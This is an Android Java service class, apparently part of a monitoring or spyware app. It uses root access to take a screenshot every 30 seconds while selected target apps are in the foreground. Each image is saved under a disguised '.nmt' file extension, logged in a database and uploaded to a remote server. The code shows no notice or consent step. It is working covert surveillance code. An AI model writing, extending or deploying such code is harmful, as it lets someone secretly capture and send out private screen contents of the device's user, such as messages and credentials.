package com.sunnet.service.service;

import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Binder;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;

import com.jaredrummler.android.processes.AndroidProcesses;
import com.jaredrummler.android.processes.models.AndroidAppProcess;
import com.sunnet.service.db.DatabaseHelper;
import com.sunnet.service.db.entity.CaptureEntity;
import com.sunnet.service.log.Log;
import com.sunnet.service.task.request.RequestHelper;
import com.sunnet.service.util.ConfigApi;
import com.sunnet.service.util.Utils;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.List;

/**
 * Created by nmtien92 on 6/4/16.
 */
public class NewScreenShotService extends Service {

    public static final String ACTION_SCREENSHOT = "com.sunnet.service.service.action.screenshot";
    public static final long TIME_DELAY_CAPTURE = 30 * 1000; // 30s
    public static final String FILE_DIRECTORY = "screenshots";
    private static final int REQUEST_CODE = 0x1234AF;

    private static PendingIntent runningIntent;
    public String topPackage = "";

    private final IBinder mBinder = new LocalBinder();

    public class LocalBinder extends Binder {
        public NewScreenShotService getService() {
            return NewScreenShotService.this;
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return mBinder;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (intent != null) {
            String action = intent.getAction();

            if (action != null && action.equals(ACTION_SCREENSHOT)) {
                Log.v("ACTION_SCREENSHOT");

                if (canScreenShot() && !Utils.canBatteryLow() && Utils.isScreenOn(this)) {
                    Log.v("Take Screenshot");
                    screenshot();
                }

            }
        }

        return START_STICKY;
    }

    private static PendingIntent getRunIntent(Context context) {
        if (runningIntent == null) {
            Intent intent = new Intent(context, NewScreenShotService.class);
            intent.setAction(ACTION_SCREENSHOT);
            runningIntent = PendingIntent.getService(context, REQUEST_CODE, intent, 0);
        }

        return runningIntent;
    }

    private Runnable runnable;
    private Handler handler;

    private void startAlarm(Context context) {
//        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
//        PendingIntent pi = getRunIntent(context);
//        long startTime = SystemClock.elapsedRealtime();
//        am.setRepeating(AlarmManager.ELAPSED_REALTIME, startTime, TIME_DELAY_CAPTURE, pi);

        Intent intent = new Intent(context, NewScreenShotService.class);
        intent.setAction(ACTION_SCREENSHOT);
        startService(intent);
    }

    private void screenshot() {
        Process sh = null;
        String fileName = System.currentTimeMillis() / 1000 + ".nmt";
        Log.i("ScreenShotService preparing output file: " + fileName);
        try {
            sh = Runtime.getRuntime().exec("su", null, null);
            OutputStream os = sh.getOutputStream();
            String outputFilePath = genScreenShotFilePath(fileName);
            os.write(("/system/bin/screencap -p " + outputFilePath).getBytes("ASCII"));
            os.flush();

            os.close();
            sh.waitFor();

            /**
             * Insert into database
             */
            CaptureEntity entity = DatabaseHelper.genCaptureEntity(outputFilePath, topPackage);
            DatabaseHelper.createACapture(entity);
            RequestHelper.updateScreenshotToServer(entity);

        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private String genScreenShotFilePath(String fileName) {
        File root;
        if (getExternalCacheDir() == null)
            root = Environment.getExternalStorageDirectory();
        else
            root = getExternalCacheDir();
        String filepath = root.getAbsolutePath();
        File file = new File(filepath, FILE_DIRECTORY);
        if (!file.exists()) {
            file.mkdirs();
        }
        return (file.getAbsolutePath() + "/" + fileName);
    }

    private boolean canScreenShot() {

        Boolean canScreenShot = false;

        List<AndroidAppProcess> processes = AndroidProcesses.getRunningAppProcesses();
        for (AndroidAppProcess process : processes) {
            if (ConfigApi.packageCanTakeScreenShot(process.getPackageName()) && process.foreground) {
                canScreenShot = true;
                topPackage = process.getPackageName();
            }
        }

        Log.v("Top Package: " + topPackage);
        return canScreenShot;
    }

    public void start(Context c) {
        startAlarm(c);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        if (handler != null && runnable != null) {
            handler.removeCallbacks(runnable);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.v("onCreate(ScreenShotService)");

        handler = new Handler();
        runnable = new Runnable() {
            @Override
            public void run() {
                Log.v("==> (StartAlarm) <==");
                startAlarm(NewScreenShotService.this);
                handler.postDelayed(runnable, TIME_DELAY_CAPTURE);
            }
        };

        runnable.run();
    }
}
